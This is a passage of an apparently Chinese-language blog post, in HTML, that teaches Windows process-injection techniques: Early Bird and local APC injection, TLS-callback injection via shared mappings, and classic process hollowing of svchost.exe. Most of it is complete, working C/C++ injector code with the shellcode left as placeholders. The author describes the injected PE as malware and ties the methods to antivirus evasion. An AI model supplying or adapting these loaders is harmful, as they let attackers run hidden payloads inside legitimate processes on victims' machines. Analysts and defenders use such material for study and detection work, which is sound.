title=\"APC注入\"></a>APC注入</h1><p>APC是在某一个进程中的N多线程各自维护一个任务队列，用于异步回调，当线程处于alertable状态时，执行队列里的任务的一种机制。</p>\n<p>APC注入简单来说就是往队列里插入执行shellcode的任务。</p>\n<p>常规的APC进程注入具有不确定性，需要线程能够处于alertable状态，而处于该状态是需要一些特定函数的：ReadFileEx,SetWaitableTimer, SetWaitableTimerEx和WriteFileEx等 ，所以常规是注入到explorer.exe下的所有线程中，故不再记录。</p>\n<p>这里直接记录比较实用的两种技术：<strong>Early Bird远程进程注入</strong> 和 <strong>本地进程注入</strong>，在这之前要先介绍 <strong>NtTestAlert 函数</strong>，该函数是ntdll中一个未导出函数，<strong>会在线程初始化时进行调用</strong>，作用是清空并处理APC队列内任务，所以会在进程的主线程入口点之前运行任务并接管进程控制权。具体调用链为：<strong>LdrInitializeThunk → LdrpInitialize → _LdrpInitialize → NtTestAlert → KiUserApcDispatcher</strong></p>\n<h2 id=\"Early-Bird\"><a href=\"#Early-Bird\" class=\"headerlink\" title=\"Early Bird\"></a>Early Bird</h2><p><strong>Early Bird 远程注入原理</strong> ：创建一个主线程挂起的进程，然后恢复线程进行初始化，调用NtTestAlert执行shellcode</p>\n<p>流程如下：</p>\n<ul>\n<li><p>创建一个挂起的进程(通常是windows的合法进程)，如svchost</p>\n</li>\n<li><p>在挂起的进程内申请一块可读可写可执行的内存空间</p>\n</li>\n<li><p>往申请的空间内写入shellcode</p>\n</li>\n<li><p>将APC插入到该进程的主线程</p>\n</li>\n<li><p>恢复挂起进程的线程</p>\n</li>\n<li><p>ResumeThread调用NtTestAlert</p>\n</li>\n<li><p>处理APC队列</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    unsigned char buf[] &#x3D; &quot;xxx&quot;;</span><br><span class=\"line\">    SIZE_T shellSize &#x3D; sizeof(buf);</span><br><span class=\"line\">    STARTUPINFOA si &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\">    PROCESS_INFORMATION pi &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    CreateProcessA(&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);</span><br><span class=\"line\">    HANDLE victimProcess &#x3D; pi.hProcess;</span><br><span class=\"line\">    HANDLE threadHandle &#x3D; pi.hThread;</span><br><span class=\"line\"></span><br><span class=\"line\">    LPVOID shellAddress &#x3D; VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    PTHREAD_START_ROUTINE apcRoutine &#x3D; (PTHREAD_START_ROUTINE)shellAddress;</span><br><span class=\"line\"></span><br><span class=\"line\">    WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);</span><br><span class=\"line\">    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);</span><br><span class=\"line\">    ResumeThread(threadHandle);</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为这样要创建一个新的进程，很有可能会有窗口体显示，所以还可以在 已存在进程中注入</p>\n<ul>\n<li><p>在已有进程中创建一个挂起的线程</p>\n</li>\n<li><p>写入shellcode</p>\n</li>\n<li><p>插入apc队列</p>\n</li>\n<li><p>恢复挂起的线程</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    unsigned char shellcode[] &#x3D; &quot;&quot;;</span><br><span class=\"line\">    LPCSTR name &#x3D; &quot;notepad.exe&quot;;</span><br><span class=\"line\">    DWORD targetPID &#x3D; GetProcessPID(name);</span><br><span class=\"line\">    HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, NULL, targetPID);</span><br><span class=\"line\">    PVOID AllocAddr &#x3D; VirtualAllocEx(hProcess, 0, sizeof(shellcode) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    WriteProcessMemory(hProcess, AllocAddr, shellcode, sizeof(shellcode) + 1, 0);</span><br><span class=\"line\">    system(&quot;pause&quot;);</span><br><span class=\"line\">    HANDLE hThread &#x3D; CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);</span><br><span class=\"line\">    &#x2F;&#x2F;插入APC队列</span><br><span class=\"line\">    QueueUserAPC((PAPCFUNC)AllocAddr, hThread, 0);</span><br><span class=\"line\">    system(&quot;pause&quot;);</span><br><span class=\"line\">    &#x2F;&#x2F;恢复线程触发APC执行</span><br><span class=\"line\">    ResumeThread(hThread);</span><br><span class=\"line\">    &#x2F;&#x2F;WaitForSingleObject(hThread,INFINITE);</span><br><span class=\"line\">    &#x2F;&#x2F;CloseHandle(hProcess);</span><br><span class=\"line\">    CloseHandle(hThread);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注入notepad.exe</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1721143608451.png\" alt=\"QQ_1721143608451\"></p>\n<h2 id=\"本地进程注入\"><a href=\"#本地进程注入\" class=\"headerlink\" title=\"本地进程注入\"></a>本地进程注入</h2><p><strong>本地进程注入原理</strong>：自身主动调用NtTestAlert处理APC，相关代码在《免杀入门》出现过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef DWORD(WINAPI* pNtTestAlert)();</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 修改 shellcode 所在内存区域的保护属性，允许执行</span><br><span class=\"line\">    DWORD oldProtect;</span><br><span class=\"line\">    VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;获取NtTestAlert函数地址, 因为它是一个内部函数.无法直接通过函数名调用</span><br><span class=\"line\">    pNtTestAlert NtTestAlert &#x3D; (pNtTestAlert)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtTestAlert&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 将buf强转为APC 函数,向当前线程的异步过程调用(APC)队列添加一个执行shellcode的任务</span><br><span class=\"line\">    QueueUserAPC((PAPCFUNC)buf, GetCurrentThread(), NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;调用NtTestAlert，触发 APC 队列中的任务执行（即执行 shellcode）</span><br><span class=\"line\">    NtTestAlert();</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"TLS注入\"><a href=\"#TLS注入\" class=\"headerlink\" title=\"TLS注入\"></a>TLS注入</h1><p>关于TLS，个人认为算不上是进程注入的一种技术，更像是一种能够代码执行的机制，TLS机制在《免杀入门》已经有过介绍，这里引用：</p>\n<p><a href=\"https://idiotc4t.com/code-and-dll-process-injection/tls-code-execute\">https://idiotc4t.com/code-and-dll-process-injection/tls-code-execute</a> 代码，实现 TLS机制+mapping技术进行进程注入。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;) </span><br><span class=\"line\">#pragma comment (lib, &quot;OneCore.lib&quot;)</span><br><span class=\"line\">#include &lt;Tlhelp32.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">char shellcode[] &#x3D; &quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD pid;</span><br><span class=\"line\">VOID NTAPI TlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tWCHAR lpszProcessName[] &#x3D; L&quot;notepad.exe&quot;;</span><br><span class=\"line\">\tif (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tHANDLE hSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);</span><br><span class=\"line\">\t\tPROCESSENTRY32 pe;</span><br><span class=\"line\">\t\tpe.dwSize &#x3D; sizeof pe;</span><br><span class=\"line\">\t\tif (Process32First(hSnapshot, &amp;pe))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tdo &#123;</span><br><span class=\"line\">\t\t\t\tif (lstrcmpi(lpszProcessName, pe.szExeFile) &#x3D;&#x3D; 0)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tCloseHandle(hSnapshot);</span><br><span class=\"line\">\t\t\t\t\tpid &#x3D; pe.th32ProcessID;</span><br><span class=\"line\">\t\t\t\t\tbreak;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125; while (Process32Next(hSnapshot, &amp;pe));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tHANDLE hMapping &#x3D; CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tLPVOID lpMapAddress &#x3D; MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode));</span><br><span class=\"line\">\t\tmemcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));</span><br><span class=\"line\">\t\tHANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class=\"line\">\t\tLPVOID lpMapAddressRemote &#x3D; MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);</span><br><span class=\"line\">\t\tHANDLE hRemoteThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);</span><br><span class=\"line\">\t\tUnmapViewOfFile(lpMapAddress);</span><br><span class=\"line\">\t\tCloseHandle(hMapping);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment (linker, &quot;&#x2F;INCLUDE:__tls_used&quot;)</span><br><span class=\"line\">#pragma comment (linker, &quot;&#x2F;INCLUDE:__tls_callback&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma data_seg (&quot;.CRT$XLB&quot;)</span><br><span class=\"line\">EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback &#x3D; TlsCallBack;</span><br><span class=\"line\">#pragma data_seg ()</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"Process-Hollowing\"><a href=\"#Process-Hollowing\" class=\"headerlink\" title=\"Process Hollowing*\"></a>Process Hollowing*</h1><p>进程镂空/傀儡进程  基本原理如图：类似于DLL Hollowing，掏空目标（exe进程）的内存空间，覆写PE/shellcode。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/process-hollowing.gif\" alt=\"process-hollowing\"></p>\n<p>在我学习该方法时，有许多的变体，这里列出表格概述：原始PE为要注入的合法目标，新PE为待注入的恶意软件</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>原理解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>经典Process Hollowing</td>\n<td>原始 PE 在内存中取消映射，并且新PE从相同起始地址开辟RWX空间，写入后执行</td>\n</tr>\n<tr>\n<td>经典Process Hollowing变体</td>\n<td>原始PE内存中保持原样，新PE被写入到新的RWX内存，从新地址执行</td>\n</tr>\n<tr>\n<td>Process Overwriting</td>\n<td>原始PE内存中保持映射，直接将新PE覆写，执行</td>\n</tr>\n<tr>\n<td>Process Stomping</td>\n<td>通过寻找滥用RWX权限section的PE (exe或dll) ，将shellcode写入该区域，执行</td>\n</tr>\n</tbody></table>\n<p>另外关于不同版本：</p>\n<p>当编译为32位时，仅支持x86架构</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">32 bit evil-PE -&gt; 32 bit target-PE</span><br></pre></td></tr></table></figure>\n\n<p>当编译为64位时，支持两种架构</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">64 bit evil-PE -&gt; 64 bit target-PE</span><br><span class=\"line\">32 bit evil-PE -&gt; 32 bit target-PE</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"经典Process-Hollowing\"><a href=\"#经典Process-Hollowing\" class=\"headerlink\" title=\"经典Process Hollowing\"></a>经典Process Hollowing</h2><p>经典镂空通过创建挂起的进程，将内存映射取消，并在同一位置（基址）开辟内存，将要注入的PE覆写进去，通过设置寄存器的值设置上下文，然后恢复挂起线程。</p>\n<p>流程如下：</p>\n<ul>\n<li><p>CreateProcess 创建一个挂起的合法进程</p>\n</li>\n<li><p>CreateFile 读取恶意PE</p>\n</li>\n<li><p>GetThreadContext 获取挂起进程上下文与环境信息</p>\n</li>\n<li><p>NtUnmapViewOfSection 卸载挂起进程内存</p>\n</li>\n<li><p>VirtualAllocEx 开辟空间</p>\n</li>\n<li><p>WriteProcessMemory 写入PE</p>\n</li>\n<li><p>修复重定位表</p>\n</li>\n<li><p>SetThreadContext 设置上下文</p>\n</li>\n<li><p>ResumeThread 恢复挂起进程</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct IMAGE_RELOCATION_ENTRY &#123;</span><br><span class=\"line\">\tWORD Offset : 12;</span><br><span class=\"line\">\tWORD Type : 4;</span><br><span class=\"line\">&#125; IMAGE_RELOCATION_ENTRY, * PIMAGE_RELOCATION_ENTRY;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 要确保SourceFile和TargetFile的Subsystem相同，否则注入失败</span><br><span class=\"line\">const LPCSTR SourceFile &#x3D; &quot;C:\\\\Users\\\\cys\\\\Desktop\\\\shellcode.exe&quot;;  &#x2F;&#x2F; 待注入PE</span><br><span class=\"line\">const LPCSTR TargetFile &#x3D; &quot;C:\\\\windows\\\\System32\\\\svchost.exe&quot;;  &#x2F;&#x2F; 目标PE</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; Process-Hollowing</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F;创建挂起进程</span><br><span class=\"line\">\tSTARTUPINFOA si &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\">\tsi.cb &#x3D; sizeof(STARTUPINFOA);</span><br><span class=\"line\">\tPROCESS_INFORMATION pi;</span><br><span class=\"line\"></span><br><span class=\"line\">\tCreateProcessA(</span><br><span class=\"line\">\t\tTargetFile,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tFALSE,</span><br><span class=\"line\">\t\tCREATE_SUSPENDED,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\t&amp;si,</span><br><span class=\"line\">\t\t&amp;pi</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!pi.hProcess) &#123; cerr &lt;&lt; &quot;[-]Creat process fail&quot;; return 1; &#125;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]Process PID: &quot; &lt;&lt; pi.dwProcessId &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">\tHANDLE hfile &#x3D; CreateFile(SourceFile, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class=\"line\">\tDWORD dwFileSize &#x3D; GetFileSize(hfile, NULL);</span><br><span class=\"line\">\tPVOID lpBuffer &#x3D; VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class=\"line\">\tDWORD dwReadSize &#x3D; 0;</span><br><span class=\"line\">\tReadFile(hfile, lpBuffer, dwFileSize, &amp;dwReadSize, NULL);</span><br><span class=\"line\">\tCloseHandle(hfile);</span><br><span class=\"line\"></span><br><span class=\"line\">\tCONTEXT ctx;</span><br><span class=\"line\">\tctx.ContextFlags &#x3D; CONTEXT_FULL;</span><br><span class=\"line\">\tGetThreadContext(pi.hThread, &amp;ctx);</span><br><span class=\"line\">\tPVOID RemoteImageBase;</span><br><span class=\"line\">\tBOOL readpeb &#x3D; NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 获取被挂起进程基址技巧：通过寄存器https:&#x2F;&#x2F;bbs.kanxue.com&#x2F;thread-253432-1.htm</span><br><span class=\"line\">#ifdef _WIN64</span><br><span class=\"line\">\t&#x2F;&#x2F; 从rdx寄存器中获取PEB地址，并从PEB中读取挂起的可执行映像的基址</span><br><span class=\"line\">\treadpeb &#x3D; ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;RemoteImageBase, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">#ifdef _X86_</span><br><span class=\"line\">\t&#x2F;&#x2F; 从ebx寄存器中获取PEB地址，并从PEB中读取挂起的可执行映像的基址</span><br><span class=\"line\">\treadpeb &#x3D; ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &amp;RemoteImageBase, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\tif (!readpeb) &#123;</span><br><span class=\"line\">\t\tDWORD error &#x3D; GetLastError();</span><br><span class=\"line\">\t\tcout &lt;&lt; &quot;[-]ReadProcessMemory failed with error code: &quot; &lt;&lt; error &lt;&lt; endl;</span><br><span class=\"line\">\t\treturn 1;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t&#x2F;&#x2F; unmap卸载内存</span><br><span class=\"line\">\tpNtUnmapViewOfSection NtUnmapViewOfSection &#x3D; (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtUnmapViewOfSection&quot;);</span><br><span class=\"line\">\tNTSTATUS result &#x3D; NtUnmapViewOfSection(pi.hProcess, RemoteImageBase);</span><br><span class=\"line\">\tif (result) &#123; cout &lt;&lt; &quot;[-]NtUnmapViewOfSection fail&quot; &lt;&lt; endl; return 1; &#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tconst auto pDos &#x3D; (PIMAGE_DOS_HEADER)lpBuffer;</span><br><span class=\"line\">\tconst auto pNt &#x3D; (PIMAGE_NT_HEADERS)((LPBYTE)lpBuffer + pDos-&gt;e_lfanew);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F;对挂起进程开辟空间</span><br><span class=\"line\">\tLPVOID pRemoteMem &#x3D; VirtualAllocEx(pi.hProcess, RemoteImageBase, pNt-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[*]VirtualAllocEx: 0x&quot; &lt;&lt; pRemoteMem &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">\tconst DWORD64 DeltaImageBase &#x3D; (DWORD64)pRemoteMem - pNt-&gt;OptionalHeader.ImageBase;</span><br><span class=\"line\">\tpNt-&gt;OptionalHeader.ImageBase &#x3D; (DWORD64)pRemoteMem;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;写入文件头，包括 DOS&#x2F;NT&#x2F;SECTION headers</span><br><span class=\"line\">\t&#x2F;&#x2F;从 pi.hProcess 中的 pRemoteMem 地址开始写 lpBuffer 内容的 pNt-&gt;OptionalHeader.SizeOfHeaders 大小字节</span><br><span class=\"line\">\tWriteProcessMemory(pi.hProcess, pRemoteMem, lpBuffer, pNt-&gt;OptionalHeader.SizeOfHeaders, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">\tconst IMAGE_DATA_DIRECTORY ImageDataReloc &#x3D; pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER lpImageRelocSection &#x3D; nullptr;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;写入section节区</span><br><span class=\"line\">\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tconst auto lpImageSectionHeader &#x3D; (PIMAGE_SECTION_HEADER)((uintptr_t)pNt + 4 + sizeof(IMAGE_FILE_HEADER) + pNt-&gt;FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));</span><br><span class=\"line\">\t\t&#x2F;&#x2F; 定位reloc</span><br><span class=\"line\">\t\tif (ImageDataReloc.VirtualAddress &gt;&#x3D; lpImageSectionHeader-&gt;VirtualAddress &amp;&amp; ImageDataReloc.VirtualAddress &lt; (lpImageSectionHeader-&gt;VirtualAddress + lpImageSectionHeader-&gt;Misc.VirtualSize))</span><br><span class=\"line\">\t\t\tlpImageRelocSection &#x3D; lpImageSectionHeader;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tPVOID pSectionDestination &#x3D; (PVOID)((LPBYTE)pRemoteMem + lpImageSectionHeader-&gt;VirtualAddress);</span><br><span class=\"line\">\t\tWriteProcessMemory(pi.hProcess, pSectionDestination, (LPVOID)((uintptr_t)lpBuffer + lpImageSectionHeader-&gt;PointerToRawData), lpImageSectionHeader-&gt;SizeOfRawData, nullptr);</span><br><span class=\"line\">\t\tcout &lt;&lt; &quot;[*]Writing &quot; &lt;&lt; lpImageSectionHeader-&gt;Name &lt;&lt; &quot; section to 0x&quot; &lt;&lt; hex &lt;&lt; pSectionDestination &lt;&lt; endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+] Relocation section :&quot; &lt;&lt; lpImageRelocSection-&gt;Name &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;修复重定位</span><br><span class=\"line\">\tDWORD RelocOffset &#x3D; 0;</span><br><span class=\"line\">\twhile (RelocOffset &lt; ImageDataReloc.Size)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tconst auto lpImageBaseRelocation &#x3D; (PIMAGE_BASE_RELOCATION)((DWORD64)lpBuffer + lpImageRelocSection-&gt;PointerToRawData + RelocOffset);</span><br><span class=\"line\">\t\tRelocOffset +&#x3D; sizeof(IMAGE_BASE_RELOCATION);</span><br><span class=\"line\">\t\tconst DWORD NumberOfEntries &#x3D; (lpImageBaseRelocation-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) &#x2F; sizeof(IMAGE_RELOCATION_ENTRY);</span><br><span class=\"line\">\t\tfor (DWORD i &#x3D; 0; i &lt; NumberOfEntries; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tconst auto lpImageRelocationEntry &#x3D; (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpBuffer + lpImageRelocSection-&gt;PointerToRawData + RelocOffset);</span><br><span class=\"line\">\t\t\tRelocOffset +&#x3D; sizeof(IMAGE_RELOCATION_ENTRY);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tif (lpImageRelocationEntry-&gt;Type &#x3D;&#x3D; 0)</span><br><span class=\"line\">\t\t\t\tcontinue;</span><br><span class=\"line\">\t\t\tconst DWORD64 AddressLocation &#x3D; (DWORD64)pRemoteMem + lpImageBaseRelocation-&gt;VirtualAddress + lpImageRelocationEntry-&gt;Offset;</span><br><span class=\"line\">\t\t\tDWORD64 PatchedAddress &#x3D; 0;</span><br><span class=\"line\">\t\t\tReadProcessMemory(pi.hProcess, (LPVOID)AddressLocation, &amp;PatchedAddress, sizeof(DWORD64), nullptr);</span><br><span class=\"line\">\t\t\tPatchedAddress +&#x3D; DeltaImageBase;</span><br><span class=\"line\">\t\t\tWriteProcessMemory(pi.hProcess, (LPVOID)AddressLocation, &amp;PatchedAddress, sizeof(DWORD64), nullptr);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+] Relocations done&quot; &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;https:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;57341183&#x2F;view-address-of-entry-point-in-eax-register-for-a-suspended-process-in-windbg</span><br><span class=\"line\">#ifdef _WIN64</span><br><span class=\"line\">\t&#x2F;&#x2F;将rcx寄存器设置为注入软件的入口点</span><br><span class=\"line\">\tctx.Rcx &#x3D; (SIZE_T)((LPBYTE)pRemoteMem + pNt-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class=\"line\">\tWriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;pRemoteMem, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">#ifdef _X86_</span><br><span class=\"line\">\t&#x2F;&#x2F;将eax寄存器设置为注入软件的入口点</span><br><span class=\"line\">\tctx.Eax &#x3D; (SIZE_T)((LPBYTE)pRemoteMem + pNt-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class=\"line\">\tWriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &amp;pRemoteMem, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\t&#x2F;&#x2F;释放本内存中PE痕迹</span><br><span class=\"line\">\tVirtualFree(lpBuffer, 0, MEM_RELEASE);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]SetThreadContext&quot; &lt;&lt; endl;</span><br><span class=\"line\">\tSetThreadContext(pi.hThread, &amp;ctx);</span><br><span class=\"line\">\tResumeThread(pi.hThread);</span><br><span class=\"line\">\tCloseHandle(pi.hThread);</span><br><span class=\"line\">\tCloseHandle(pi.hProcess);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>unmap前：Image类型内存</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1721573785580.png\" alt=\"QQ_1721573785580\"></p>\n<p>unmap后：取消映射</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1721573824084.png\" alt=\"QQ_1721573824084\"></p>\n<p>同一地址再开辟：变为Private类型</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1721573892710.png\" alt=\"QQ_1721573892710\"></p>\n<p>恢复线程：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ_1723687845227.png\" alt=\"QQ_1723687845227\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ_1723688440624.png\" alt=\"QQ_1723688440624\"></p>\n<p><strong>过程中一些问题：</strong></p>\n<p>Q：为什么修复重定位表？</p>\n<p>A：加载基址与imagebase不一样。</p>\n<p>Q：程序没有reloc怎么办？</p>\n<p>A：使用变体即可，否则使用经典会报错</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ_1723688682452.png\" alt=\"QQ_1723688682452\"></p>\n<p>Q：为什么在x64镂空svchost.exe会失败？</p>\n<p>A：看到某项目中一句话，具体原因还没调试。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">In Process Hollowing Injection technique, it Crashes With Some 64bit process like System32\\svchost.exe,... </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1721575525006.png\" 